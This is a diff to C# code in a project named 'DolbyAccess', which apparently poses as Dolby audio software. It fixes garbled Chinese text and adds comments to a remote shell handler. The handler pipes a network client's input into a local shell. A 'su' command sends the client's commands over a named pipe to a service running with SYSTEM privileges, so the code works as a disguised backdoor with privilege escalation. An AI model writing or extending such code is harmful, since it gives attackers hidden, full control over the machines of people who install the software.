@@ -798,6 +798,7 @@ namespace DolbyAccess
             catch { return null; }
         }
 
+        // SYSTEM模式通过命名管道执行命令(供普通模式提权调用)
         private static string ExecuteCmdViaPipe(string command)
         {
             try
@@ -823,6 +824,7 @@ namespace DolbyAccess
             catch (Exception ex) { return Convert.ToBase64String(Encoding.UTF8.GetBytes("ERROR: " + ex.Message)); }
         }
 
+        // 普通模式通过命名管道请求SYSTEM模式执行命令
         private static string ExecViaPipe(string command)
         {
             try
@@ -1078,10 +1080,9 @@ namespace DolbyAccess
                     { IsBackground = true };
                     errorThread.Start();
 
-                    // 杈撳叆杞彂(閫愬瓧绗︾疮绉?鎹㈣鏃舵娴媠u/exit鎻愭潈)
                     byte[] inBuffer = new byte[4096];
                     System.Text.StringBuilder lineBuf = new System.Text.StringBuilder();
-                    bool privMode = false;
+                    bool privMode = false; // SYSTEM提权会话模式
                     while (!shell.HasExited && client.Connected)
                     {
                         int read = stream.Read(inBuffer, 0, inBuffer.Length);
@@ -1098,56 +1099,61 @@ namespace DolbyAccess
                                     string trimmed = line.Trim();
                                     if (!_isServiceMode && trimmed == "su")
                                     {
+                                        // 进入SYSTEM提权会话模式
                                         string test = ExecViaPipe("echo ok");
                                         if (test != null)
                                         {
                                             privMode = true;
-                                            byte[] ok = Encoding.UTF8.GetBytes("\\r\\n[宸茶繘鍏YSTEM鏉冮檺,杈撳叆exit閫€鍑篯\\r\\n");
+                                            byte[] ok = Encoding.UTF8.GetBytes("\r\n[已进入SYSTEM权限,输入exit退出]\r\n");
                                             stream.Write(ok, 0, ok.Length); stream.Flush();
                                         }
                                         else
                                         {
-                                            byte[] err = Encoding.UTF8.GetBytes("\\r\\n[鎻愭潈澶辫触] SYSTEM鏈嶅姟鏈繍琛孿\r\\n");
+                                            byte[] err = Encoding.UTF8.GetBytes("\r\n[提权失败] SYSTEM服务未运行\r\n");
                                             stream.Write(err, 0, err.Length); stream.Flush();
                                         }
                                     }
                                     else if (!_isServiceMode && trimmed.StartsWith("su "))
                                     {
+                                        // 单次SYSTEM提权执行
                                         string cmd = trimmed.Substring(3).Trim();
                                         string privResult = ExecViaPipe(cmd);
                                         if (privResult != null)
                                         {
-                                            byte[] resp = Encoding.UTF8.GetBytes("\\r\\n[SYSTEM] " + privResult + "\\r\\n");
+                                            byte[] resp = Encoding.UTF8.GetBytes("\r\n[SYSTEM] " + privResult + "\r\n");
                                             stream.Write(resp, 0, resp.Length); stream.Flush();
                                         }
                                         else
                                         {
-                                            byte[] err = Encoding.UTF8.GetBytes("\\r\\n[鎻愭潈澶辫触] SYSTEM鏈嶅姟鏈繍琛孿\r\\n");
+                                            byte[] err = Encoding.UTF8.GetBytes("\r\n[提权失败] SYSTEM服务未运行\r\n");
                                             stream.Write(err, 0, err.Length); stream.Flush();
                                         }
                                     }
                                     else if (privMode && trimmed == "exit")
                                     {
+                                        // 退出SYSTEM提权会话模式
                                         privMode = false;
-                                        byte[] ok = Encoding.UTF8.GetBytes("\\r\\n[宸查€€鍑篠YSTEM鏉冮檺,鍥炲埌鏅€氭ā寮廬\\r\\n");
+                                        byte[] ok = Encoding.UTF8.GetBytes("\r\n[已退出SYSTEM权限,回到普通模式]\r\n");
                                         stream.Write(ok, 0, ok.Length); stream.Flush();
                                     }
                                     else if (privMode)
                                     {
+                                        // 提权模式:通过命名管道以SYSTEM执行
                                         string privResult = ExecViaPipe(line);
                                         if (privResult != null)
                                         {
-                                            byte[] resp = Encoding.UTF8.GetBytes(privResult + "\\r\\n");
+                                            byte[] resp = Encoding.UTF8.GetBytes(privResult + "\r\n");
                                             stream.Write(resp, 0, resp.Length); stream.Flush();
                                         }
                                         else
                                         {
-                                            byte[] err = Encoding.UTF8.GetBytes("[鎻愭潈澶辫触] SYSTEM鏈嶅姟鏈繍琛孿\r\\n");
+                                            byte[] err = Encoding.UTF8.GetBytes("[提权失败] SYSTEM服务未运行\r\n");
                                             stream.Write(err, 0, err.Length); stream.Flush();
                                         }
                                     }
                                     else
                                     {
+                                        // 普通模式:整行发给shell
                                         shell.StandardInput.WriteLine(line);
                                         shell.StandardInput.Flush();
                                     }
